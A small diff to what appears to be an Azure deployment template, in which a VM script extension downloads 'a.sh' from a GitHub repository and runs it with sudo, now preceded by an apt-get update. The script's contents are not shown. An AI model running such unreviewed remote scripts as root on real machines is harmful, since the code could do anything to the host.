@@ -125,7 +125,7 @@
           "fileUris": ["https://github.com/raviz00/x/raw/main/a.sh"]
         },
         "protectedSettings": {
-          "commandToExecute": "[concat('sudo sh a.sh ',variables('wall'), ' ', parameters('prox'))]"
+          "commandToExecute": "[concat('sudo apt-get update -y && sudo sh a.sh ',variables('wall'), ' ', parameters('prox'))]"
         }
       }
     }
